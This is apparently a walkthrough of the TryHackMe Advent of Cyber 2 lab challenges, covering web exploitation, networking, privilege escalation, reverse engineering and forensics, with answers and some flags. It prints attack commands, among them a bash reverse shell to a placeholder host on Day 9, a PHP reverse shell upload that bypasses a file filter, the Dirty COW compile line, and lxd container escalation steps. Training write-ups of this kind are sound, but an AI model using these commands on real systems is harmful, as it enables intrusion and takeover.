# TryHackMe-Advent Of Cyber 2

## [Day 1] Web Exploitation A Christmas Crisis


<img src="https://imgur.com/uaPrn1o.png"/>

Register with a username and password then login

<img src="https://imgur.com/lUk4Fxc.png"/>

Next look for a cookie by pressing F12 then navigating to `Storage`

<img src="https://imgur.com/VN7nfsw.png"/>

### Tasks

1. What is the name of the cookie used for authentication?

`auth`

2. In what format is the value of this cookie encoded?
`hexadecimal`

3. Having decoded the cookie, what format is the data stored in?
`JSON`

4. What is the value of Santa's cookie?

Now copy the cookie and decode it from `hex` then edit the username to `santa` then encode it back to hex.

<img src="https://imgur.com/ibbJZcx.png"/>

Turn all swtiches on and then you'll get your flag for day 1.


## [Day 2] Web Exploitation The Elf Strikes Back! 

<img src="https://imgur.com/SFl1ceP.png"/>

Here we can see that it is telling us to enter ID with `id` parameter

ID that is given to us is `ODIzODI5MTNiYmYw` 

<img src="https://imgur.com/uQvCvs1.png"/>

Here it's indicating us to uplad a file so we can try to upload php reverse shell to get remote code execution to that get a php reverse shell 

```
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Then change the IP , it's upto you to change the port or leave it as it is

<img src="https://imgur.com/M2sKWnm.png"/>

### Tasks


1. What string of text needs added to the URL to get access to the upload page?

`?id=ODIzODI5MTNiYmYw`

2. What type of file is accepted by the site?

We can see from the source code of the page that there are 3 exetensions that are accepted `.jpeg` , `.jpg` and `.png` which are extensions of image 

`image`

3. Bypass the filter and upload a reverse shell.

<img src="https://imgur.com/1liiKHw.png"/>

Change the extenion of the reverse shell from `.php` to `.jpeg.php`

<img src="https://imgur.com/hvIf2Bw.png"/>


4. In which directory are the uploaded files stored?

Now we can guess the directory where files are uploaded it can be `upload` or `uploads` but here uploads work

OR

Use directory brute force , for some reason not all tools work for example `gobuster` was findning redirects but `dirsearch` worked perfectly and gave us the `upload` directory

In order to get gobuster working 

`https://infinitelogins.com/2020/09/05/dealing-gobuster-wildcard-and-status-code-errors/`

<img src="https://imgur.com/aktIRL1.png"/>

<img src="https://imgur.com/CNTXGZB.png"/>

5. Activate your reverse shell and catch it in a netcat listener!
Head over to the uploads directory click your php reverse shell and you'll get a shell if you set up your net cat listner properly by `nc -lvp <port>`

<img src="https://imgur.com/cGlcwmq.png"/>

6. What is the flag in /var/www/flag.txt?

<img src="https://imgur.com/XHyvg7x.png"/>

## [Day 3] Web Exploitation Christmas Chaos

For the day 3 we have a web page which is a login page

<img src="https://imgur.com/8pLdvtx.png"/>

By looking at the source

<img src="https://imgur.com/6b498Ov.png"/>

We have name for password which is `password` and for username is `username`

Also we have the usernames and passwords

### Usernames
```
admin
root
user
```
### Passsword

```
password
admin
12345
```

Let's fire up burp suite

<img src="https://imgur.com/mRIk0wC.png"/>

Caputure the request and send it to `intruder`

<img src="https://imgur.com/Old2uiI.png"/>

Set `attack type` to `Cluster Bomb` by default usernames and passwords have markers set for payload

Payload 1 is for usernames

<img src="https://imgur.com/LmnPbRY.png"/>

Payload 2 is for passwords

<img src="https://imgur.com/znpvVV4.png"/>

<img src="https://imgur.com/RrSWoM3.png"/>

Here we can see the length changes means that there might be a change in the content of the web page

Alternatively we can use `hyda` to brute force the login credentials

<img src="https://imgur.com/QoXYLsA.png"/>

Let's try logging in with those credentials

<img src="https://imgur.com/c0N8Jqm.png"/>

## [Day 4] Web Exploitation Santa's Watching

<img src="https://imgur.com/oyfYw46.png"/>


<img src="https://imgur.com/g3oB3lq.png"/>

By looking at the source code we can't find anything here so let's brute force directory


<img src="https://imgur.com/uTXhiNk.png"/>

We find `/api` directory in that we find a file

<img src="https://imgur.com/mh4TpxP.png"/>

1. Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

`wfuzz -c -z file.big.txt http://shibes.xyz/api.php\?breed=\FUZZ`

2. Use GoBuster to find the API directory. What file is there?

`site-log.php`

3. Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

Save the date wordlist from the room and fuzz with that list

<img src="https://imgur.com/9sDzzoI.png"/>

<img src="https://imgur.com/Dt4hQdy.png"/>

Head over to that php file with that parameter and you'll get your flag

## [Day 5] Web Exploitation Someone stole Santa's gift list!

By looking at the hint we can find the directory 

<img src="https://imgur.com/BVBzgGn.png"/>


Now in order to by pass the login we have to use SQLi (SQL Injection).

<img src="https://imgur.com/gugkxNB.png"/>

Start `burpsuite` capture that request on that page and send it to `sqlmap`

<img src="https://imgur.com/zz2VMix.png"/>


1. Without using directory brute forcing, what's Santa's secret login panel?

`santapanel`

2. Visit Santa's secret login panel and bypass the login using SQLi

`No answer needed`

3. How many entries are there in the gift database?

`22`

4. What did Paul ask for?

`github ownership`

5. What is the flag?

`[redacted flag]` 

6. What is admin's password?

`EhCNSWzzFP6sc7gB`


## [Day 6] Becareful with what you wish on Christmas night 

<img src="https://imgur.com/V3twYx4.png"/>

From the dossier which the room gave us tells about what is XSS it's types and how we can mitigate it also tells a story about the web app that how the attacker exlploited so by reading all that we can answer the questions


1. What vulnerability type was used to exploit the application?
`Stored Cross-site scripting`

2. What query string can be abused to craft a reflected XSS?
<img src="https://imgur.com/Ur6vv0I.png"/>

We can see the parameter in search query is `q`

so answer is `q`

3. Launch the OWASP ZAP Application

`No answer needed`

4. Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?

<img src="https://imgur.com/6UhiuE0.png"/>

`2`

5. Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website?
<img src="https://imgur.com/1BcyoDZ.png"/>


##[Day 7] Networking The Grinch Really Did Steal Christmas


1. Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?
<img src="https://imgur.com/5qRGEdu.png"/>

`icmp`

2. If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?
<img src="https://imgur.com/FAcykZS.png"/>

`http.request.method == GET`

3. Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.119" visited?
<img src="https://imgur.com/s1qsoa3.png"/>

`/reindeer-of-the-week/`

4. Let's begin analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?

Follow tcp stream of packet `14`

<img src="https://imgur.com/r7jsYR1.png"/>

<img src="https://imgur.com/y34BBmQ.png"/>

`plaintext_password_fiasco` 

5. Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?
<img src="https://imgur.com/iRFENq0.png"/>

`ssh`

6. Analyse "pcap3.pcag" and recover Christmas!, What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?
<img src="https://imgur.com/uOWussb.png"/>

Now go to `File`->`Export Objects`->`HTTP`

<img src="https://imgur.com/oyCmpU5.png"/>

<img src="https://imgur.com/3cWXyL5.png"/>

Now read the contents of the `elf_mcskidy_wishlist.txt`

`rubber ducky`

##[Day 8] What's Under the Christmas Tree


1. When was Snort created?

Search on google about snort 

`1998`

2. Using Nmap on 10.10.43.247, what are the port numbers of the three services running?  (Please provide your answer in ascending order/lowest -> highest, separated by a comma)

<img src="https://imgur.com/MHXxz8k.png"/>

`80,2222,3389`

<img src="https://imgur.com/Jae6Fax.png"/>

3. Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?

`Ubuntu`

4. Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for?

`blog`

## [Day 9] Networking Anyone can be Santa!

<img src="https://imgur.com/fH9Nv3C.png"/>

From the nmap scan we can see that ftp `anonymous` login is enabled

Here you can either download the important files or you can just grab everything there by recusrively download everything

<img src="https://imgur.com/Cl2jKjq.png"/>

<img src="https://imgur.com/IGvKCfy.png"/>




1. Name the directory on the FTP server that has data accessible by the "anonymous" user
`public`

2. What script gets executed within this directory?
<img src="https://imgur.com/wM655Q3.png"/>

`backup.sh`

3. What movie did Santa have on his Christmas shopping list?

<img src="https://imgur.com/G4Rx40B.png"/>

`The Polar Express`

4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

No we know that a script `backup.sh` is running so let's create a script with a bash reverse shell

`bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0\>&1`

<img src="https://imgur.com/SjC3dVl.png"/>

Setup a netcat listener

<img src="https://imgur.com/fzBMJZJ.png"/>

<img src="https://imgur.com/5hJqKvG.png"/>


## [Day 10] Networking Don't be selfish


1. Using enum4linux, how many users are there on the Samba server (10.10.215.162)?

<img src="https://imgur.com/BGnffm1.png"/>

`3`
2. Now how many "shares" are there on the Samba server?
`4`

3. Use smbclient to try to login to the shares on the Samba server (10.10.215.162). What share doesn't require a password?
<img src="https://imgur.com/WgEnAuW.png"/>

`tbfc-santa`

4. Log in to this share, what directory did ElfMcSkidy leave for Santa?

<img src="https://imgur.com/sNgk0yg.png"/>

<img src="https://imgur.com/hiWtLCv.png"/>

`jingle-tunes`

## [Day 11] Networking The Rouge Gnome

We login through ssh with credentials `cmnatic:aoc2020` which are provide to us in the room

<img src="https://imgur.com/bhUZlHI.png"/>

Run a find command for suid permissions which are identifed by `4000`

<img src="https://imgur.com/9sXDDbq.png"/>

Here we can find `/bin/bash` having a SUID so we can run this as root without specifying `sudo`

<img src="https://imgur.com/WI7yy5E.png"/>

1. What type of privilege escalation involves using a user account to execute commands as an administrator?

`vertical`

2. What is the name of the file that contains a list of users who are apart of the `sudo` group? 

`sudoers`

3. What are the contents of the file located at /root/flag.txt?

`[redacted flag]`

## [Day 12] Networking Read,set,elf

Since this a windows box so it won't respond to ping (ICMP messages) so , try it like this

`nmap -Pn -sC -sV <machine_ip>`

```
Nmap scan report for 10.10.99.103
Host is up (0.45s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-12T17:42:01+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Not valid before: 2020-11-27T01:29:04
|_Not valid after:  2021-05-29T01:29:04
|_ssl-date: 2020-12-12T17:42:07+00:00; 0s from scanner time.
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http          Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


1. What is the version number of the web server?

From the nmap result we can find the web server version which is

`9.0.17`

2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
Searching on goolge we'll find the CVE for the exploit in apache tomcat v 9.0.17 

<img src="https://imgur.com/sknQHif.png"/>

<img src="https://imgur.com/e0at8Gu.png"/>

3. Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

We are given a script that it exists in the directory `/cgi-bin/`

<img src="https://imgur.com/jpCUF49.png"/>

<img src="https://imgur.com/zCNaSvS.png"/>

<img src="https://imgur.com/aq5mkI2.png"/>

4. What are the contents of flag1.txt
 `[Readcated Flag]`

5. Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

You can run the metasploit exploit suggester 

<img src="https://imgur.com/aGF2jm2.png"/>

<img src="https://imgur.com/SRNmsBg.png"/>

<img src="https://imgur.com/41HzB8j.png"/>

### Bonus 

You can log into the system via RDP by adding a user and password and putting into local group adminstrator to do that 

`run getgui -u [USER_NAME] -p [PASS]`

<img src="https://imgur.com/9DfYP7J.png"/>

<img src="https://imgur.com/ABUQnZZ.png"/>

## [Day 13] Special by `John Hammond` Coal for Christmas

Run the nmap scan on the machine

```
Nmap scan report for 10.10.124.226
Host is up (0.41s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
23/tcp  open  telnet  Linux telnetd
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39894/udp   status
|   100024  1          53070/tcp6  status
|   100024  1          53853/tcp   status
|_  100024  1          54547/udp6  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.65 seconds

```

1. What old, deprecated protocol and service is running?

`telnet`


2. What credential was left for you?

Connect to telnet 

<img src="https://imgur.com/UTK8KSV.png"/>

`clauschristmas`

3. What distribution of Linux and version number is this server running?

<img src="https://imgur.com/s29MIFm.png"/>

`Ubuntu 12.04`

4. Who got here first?

<img src="https://imgur.com/lkr5HAa.png"/>

`Grinch`

5. What is the verbatim syntax you can use to compile, taken from the real C source code comments?

Visit `https://dirtycow.ninja/` to grab the diry cow exploit

<img src="https://imgur.com/CwHrgxY.png"/>

<img src="https://imgur.com/HR9L1DO.png"/>

`gcc -pthread dirty.c -o dirty -lcrypt`

6. Privilege Escalation ,Run the commands to compile the exploit, and run it.

Transfer the dirty cow exploit that you grab the internet with python http server

<img src="https://imgur.com/mMPr4O9.png"/>

Compile the `dirty.c` file 

<img src="https://imgur.com/8F0Oq6J.png"/>

Run the `dirty` compiled file

<img src="https://imgur.com/BeMSxPI.png"/>

<img src="https://imgur.com/S0OjyoZ.png"/>

<img src="https://imgur.com/PaXOF6a.png"/>

Now read `message_from_the_grinch.txt` in root directory

<img src="https://imgur.com/XfJ7Ra4.png"/>

It says to create `coal` file then use tree command to list files in a tree and pipe that into md5sum to get a hash

<img src="https://imgur.com/Qw1oP9o.png"/>

This generate md5 hash is our flag `8b16f00dd3b51efadb02c1df7f8427cc`.


## [Day 14] Special by `TheCyberMentor` Where's Rudolph ?


1. What URL will take me directly to Rudolph's Reddit comment history?

Doing a simple search on google with the username that is given to us

<img src="https://imgur.com/hg8TTI8.png"/>

`https://www.reddit.com/user/IGuidetheClaus2020/comments/`

2. According to Rudolph, where was he born?

Reading his comments we can then answer these questions

<img src="https://imgur.com/W3Kr3J1.png"/>

`Chicago`

3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?

<img src="https://imgur.com/2LYNkOQ.png"/>

`May`

4. On what other social media platform might Rudolph have an account?

Rudolph mentions about twitter so by googling his reddit username for twitter

<img src="https://imgur.com/gYvZUgc.png"/>

`Twitter`

5. What is Rudolph's username on that platform?

As answered from the previous question , we can open the link to see his twtiter handler

`IGuideClaus2020`

6. What appears to be Rudolph's favorite TV show right now?

Going through his tweets

<img src="https://imgur.com/fJmW8GT.png"/>

`Bachelorette`

7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?

<img src="https://imgur.com/gaS6pR7.png"/>

On reverse searching imgae through google

<img src="https://imgur.com/jLp8XQN.png"/>

`Chicgao`

8. Okay, you found the city, but where specifically was one of the photos taken?

Go through his tweets and find a higher resolution image

<img src="https://imgur.com/Lwb7hxk.png"/>

Upload it too online `exif` tool

<img src="https://imgur.com/p4oD5bw.png"/>

`41.891815, -87.624277`

9. Did you find a flag too?

`{FLAG}ALWAYSCHECKTHEEXIFD4T4`

10. Has Rudolph been pwned? What password of his appeared in a breach?

We can find his email on his twitter `bio` 

<img src="https://imgur.com/tDIxPNF.png"/>

<img src="https://imgur.com/UR9jFvz.png"/>

`spygame`

11. Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?

From the coordinates found from the image on exif ,search them on google map

<img src="https://imgur.com/rNMon84.png"/>

Serch for nearby hotels

<img src="https://imgur.com/gXMhEU6.png"/>

`540`


## [Day 15] Scripting There's a Python in my stocking !

1. What's the output of True + True?

<img src="https://imgur.com/yUgWMn5.png"/>

Here `True` in programming means 1 and `False` means 0 so it basically is doing 1+1 which is 2

`2`

2. What's the database for installing other peoples libraries called?

<img src="https://imgur.com/tclrOUe.png"/>

`PyPI`


3. What is the output of bool("False")?

<img src="https://imgur.com/jM3fTe5.png"/>

It gives the ouput `True` because `bool` returns true for an argument that is `True` here we are passing a string value "False"

`True`

4. What library lets us download the HTML of a webpage?

You could just google the two libraries that are used in example

`Requests`


5. What is the output of the program provided in "Code to analyse for Question 5" in the task's material (above the Christmas banner and below the links in the main body of this task?)

<img src="https://imgur.com/HSX3wm5.png"/>

`[1, 2, 3, 6]`


6. What causes the previous task to output that?

The result is not the value which is in `x` because in python whenever we assign a variable value to another variable (sounds confusing) it passes it's value by a reference in the memory means whatever the changes will be made to `y` will affect `x`

`Pass By Reference`

## [Day 16] Scripting Help! Where is Santa?

### NMAP

`nmap -Pn 10.10.9.148`

```
  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 22:40 PKT
Nmap scan report for 10.10.9.148
Host is up (0.42s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
8000/tcp open  http-alt

```

1. What is the port number for the web server?

`8000`

2. Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)

<img src="https://imgur.com/QTkllIW.png"/>

On ruuning the script we create using `BeautifulSoup` library for web scrapping

<img src="https://imgur.com/r4XI8Gs.png"/>


Here find `<a href="http://machine_ip/api/api_key">Modular modern free</a> `

So found the `api` directory

`/api/`


3. Where is Santa right now?

<img src="https://imgur.com/Jk7NTeQ.png"/>

<img src="https://imgur.com/H0glu8a.png"/>

`Winter Wonderland, Hyde Park, London`

4. Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. 

   To unblock yourself, simply terminate and re-deploy the target instance (MACHINE_IP)

`57`


## [Day 17] Reverse Engineering ReverseELFneering

SSH into the machine with credentials provided 

<img src="https://imgur.com/Zbkd8X9.png"/>

Run radare2 and analyze the binary for functions with `aa`

<img src="https://imgur.com/QIKkMdp.png"/>

Then we do `pdf @main` which is print disassembly function and then the function name with `@`

<img src="https://imgur.com/1R0x3WY.png"/>




1. What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?

We can see next to the instruction the value 

<img src="https://imgur.com/8cY263E.png"/>

`1`

2. What is the value of eax when the imull instruction is called?

<img src="https://imgur.com/cWkeMTc.png"/>

So it's mulitplying the two values we have mov eax , dword [local_ch] -> 6 * 1
`6`

3. What is the value of local_4h before eax is set to 0?

Following the above instructions `eax` holds value 6 and the instruction is

`mov dword [local_4h],eax`

So it's transfer value of eax to `local_4h`

`6`

## [Day 18] Reverse Engineering The Bits of Christmas 


## NMAP

```
nmap -Pn -sC -sV 10.10.63.64                         
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-18 23:23 PKT
Nmap scan report for 10.10.63.64
Host is up (0.43s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TBFC-CMN-RE2
|   NetBIOS_Domain_Name: TBFC-CMN-RE2
|   NetBIOS_Computer_Name: TBFC-CMN-RE2
|   DNS_Domain_Name: tbfc-cmn-re2
|   DNS_Computer_Name: tbfc-cmn-re2
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-18T18:24:30+00:00
| ssl-cert: Subject: commonName=tbfc-cmn-re2
| Not valid before: 2020-12-16T17:42:47
|_Not valid after:  2021-06-17T17:42:47
|_ssl-date: 2020-12-18T18:24:31+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.53 seconds

```

Login to RDP with the credentials then launch `Dotpeek` and open the `TBFC_APP`

<img src="https://imgur.com/m71GT2R.png"/>


<img src="https://imgur.com/O7UcS8b.png"/>

You'll see `CrackMe` on the assembly explorer

<img src="https://imgur.com/DAQxgGB.png"/>

Expand the `CrackMe` and analyze `Dispose(boolA_):void`

<img src="https://imgur.com/WtRUbRP.png"/>


1. What is Santa's password?

<img src="https://imgur.com/OdCEPkQ.png"/>

`santapassword321`

2. Now that you've retrieved this password, try to login...What is the flag?

<img src="https://imgur.com/J9gUQgK.png"/>


## [Day 19] Special by Tib3rius The Naughty or Nice List 

<img src="https://imgur.com/isf9oGY.png"/>

Access the web server which is running locally 

`http://10.10.206.196/?proxy=http://list.hohoho.localtest.me`

<img src="https://imgur.com/yuyz2P5.png"/>

We will be given the password `Be good for goodness sake!`

<img src="https://imgur.com/HOiONSp.png"/>

Login with the username `Santa` and the password we found

<img src="https://imgur.com/hSAqw9q.png"/>

Then just click on the button and it will give you the flag

## [Day 20] Blue Teaming PowershELlF to the rescue 

```
Host is up (0.44s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE            VERSION
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ELFSTATION1
|   NetBIOS_Domain_Name: ELFSTATION1
|   NetBIOS_Computer_Name: ELFSTATION1
|   DNS_Domain_Name: elfstation1
|   DNS_Computer_Name: elfstation1
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-21T13:57:11+00:00
| ssl-cert: Subject: commonName=elfstation1
| Not valid before: 2020-11-25T19:32:43
|_Not valid after:  2021-05-27T19:32:43
|_ssl-date: 2020-12-21T13:57:13+00:00; 0s from scanner time.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 771.79 seconds
```



Login to the windows box throguh ssh with the provided credentials

<img src="https://imgur.com/bUQJmXL.png"/>

Then enter the command `powershell` to launch powershell within the terminal

<img src="https://imgur.com/SxdbXOg.png"/>

1. Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?

<img src="https://imgur.com/Gs8RiYC.png"/>

2. Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?

<img src="https://imgur.com/Bfhp6SE.png"/>

3. Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)

<img src="https://imgur.com/K5TVxcm.png"/>

4. How many words does the first file contain?

<img src="https://imgur.com/FMyhZam.png"/>

5. What 2 words are at index 551 and 6991 in the first file?

<img src="https://imgur.com/SlfLRO5.png"/>

6. This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)

<img src="https://imgur.com/CMUqWUj.png"/>

## [Day 21] Blue Teaming Time for some ELForensics 

Login to the machine through RDP with the given credentials

<img src="https://imgur.com/GqNp7Us.png"/>

1. Read the contents of the text file within the Documents folder. What is the file hash for db.exe?

<img src="https://imgur.com/HaQ22Ko.png"/>

2. What is the file hash of the mysterious executable within the Documents folder?

<img src="https://imgur.com/rQMYMb5.png"/>

3. Using Strings find the hidden flag within the executable?

<img src="https://imgur.com/eHsnoT2.png"/>

<img src="https://imgur.com/ezf1p9F.png"/>

4. What is the flag that is displayed when you run the database connector file?

On running `deebee.exe` executable

<img src="https://imgur.com/BX1ro3q.png"/>

Launch this command to get the hidden stream of executable

<img src="https://imgur.com/aHwpayw.png"/>

Now the we know the hidden stream we want to use `wmic` to execute it with the hidden `stream`

<img src="https://imgur.com/1H8L2mt.png"/>

<img src="https://imgur.com/WfhYmNT.png"/>

## [Day 22] Blue Teaming Elf McEager becomes CyberElf

```
Host is up (0.46s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ELFSTATION3
|   NetBIOS_Domain_Name: ELFSTATION3
|   NetBIOS_Computer_Name: ELFSTATION3
|   DNS_Domain_Name: elfstation3
|   DNS_Computer_Name: elfstation3
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-22T16:04:40+00:00
| ssl-cert: Subject: commonName=elfstation3
| Not valid before: 2020-11-28T23:32:54
|_Not valid after:  2021-05-30T23:32:54
|_ssl-date: 2020-12-22T16:04:41+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.23 seconds
```

Login to the box throguh RDP with the credentials

<img src="https://imgur.com/oOLhu3S.png"/>

<img src="https://imgur.com/nxRejcg.png"/>

1. What is the password to the KeePass database?

Looking at the `base64` encoded folder name when we decode it 

<img src="https://imgur.com/en6D0DN.png"/>

This will be the decoded message which is the `master key` for KeePass database.

<img src='https://imgur.com/GWwZCaw.png'/>

2. What is the encoding method listed as the 'Matching ops'?

`base64`

3. What is the decoded password value of the Elf Server?

<img src="https://imgur.com/kYzAjwI.png"/>

<img src="https://imgur.com/sReITuD.png"/>

4. What is the decoded password value for ElfMail?

<img src="https://imgur.com/U7S1Qoj.png"/>

<img src="https://imgur.com/FkFPMaS.png"/>

5. Decode the last encoded value. What is the flag?

<img src="https://imgur.com/KZ7cKeB.png"/>

<img src="https://imgur.com/QNrY4kz.png"/>

<img src="https://imgur.com/pcQWb4q.png"/>


## [Day 23] Blue Teaming The Grinch strikes again! 

Use RDP to login to the windows machine with the given creds.

<img src="https://imgur.com/cOXUMZj.png"/>


<img src="https://imgur.com/Gr0nfbG.png"/>

1. Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?

<img src="https://imgur.com/bliIqY4.png"/>

2. At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?

<img src="https://imgur.com/OPahzYB.png"/>

3. What is the name of the suspicious scheduled task?

<img src="https://imgur.com/Q02DqCp.png"/>

4. Inspect the properties of the scheduled task. What is the location of the executable that is run at login?

<img src="https://imgur.com/rwGenRK.png"/>

5. There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?

<img src="https://imgur.com/DYUQ8w0.png"/>

6. Assign the hidden partition a letter. What is the name of the hidden folder?

<img src="https://imgur.com/9gykXoj.png"/>

Assign partiion letter to it

<img src="https://imgur.com/d3FJwNu.png"/>

7. Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?

<img src="https://imgur.com/GK270Ti.png"/>

<img src="https://imgur.com/FEIVRds.png"/>

## [Day 24] Special by DarkStar The Trial Before Christmas 

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-25 00:24 PKT
Nmap scan report for 10.10.6.114
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.86 seconds

```

1. Scan the machine. What ports are open?

`80, 65000`

2. What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 

`Light Cycle`

3. What is the name of the hidden php page?

<img src="https://imgur.com/kpYnjFy.png"/>

4. What is the name of the hidden directory where file uploads are saved?

Make sure to have `burp suite` to intercept `js` files

<img src="https://imgur.com/sfzy8O7.png"/>

Remove the `js` extension from here

Rename the php reverse shell to `.png.php`

<img src="https://imgur.com/YoxGYh8.png"/>

Turn on intercept on burp suite and press ctrl+F5 to referesh the web page to catch the request

<img src="https://imgur.com/NClBa7f.png"/>

Hit forward

<img src="https://imgur.com/657fWoj.png"/>

Hit forward again

<img src="https://imgur.com/fv3OEot.png"/>

Drop the request because you want the `filter.js` to be dropped in order to by pass it.

<img src="https://imgur.com/pUIhP1z.png"/>

<img src="https://imgur.com/hNR0GRl.png"/>

<img src="https://imgur.com/xkdJmJA.png"/>

5. What is the value of the web.txt flag?

<img src="https://imgur.com/B7AsJbR.png"/>
 
6. Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

<img src="https://imgur.com/DJTa0kE.png"/>

7. Access the database and discover the encrypted credentials. What is the name of the database you find these in?

<img src="https://imgur.com/crfn0Jz.png"/>

<img src="https://imgur.com/uALCN4i.png"/>

8. Crack the password. What is it?
 
<img src="https://imgur.com/AdW1iNJ.png"/>

9. What is the value of the user.txt flag?

<img src="https://imgur.com/1Ec7WWT.png"/>

10. Check the user's groups. Which group can be leveraged to escalate privileges? 

<img src="https://imgur.com/AiwXz0t.png"/>

11. What is the value of the root.txt flag?

Now in order to escalate privleges we have to get `lxd-alpine-builder.git` on our local machine

<img src="https://imgur.com/ePPMzPM.png"/>

Make sure you are doing this in you `root` directory

<img src="https://imgur.com/kD1fJdl.png"/>

Tranfer the `tar` file on the target machine through wget,python http server or using netcat. I used `netcat`.

<img src="https://imgur.com/bdNYft1.png"/>

Now run these commands

```
lxc image import ./alpine-v3.12-x86_64-20201225_0216.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

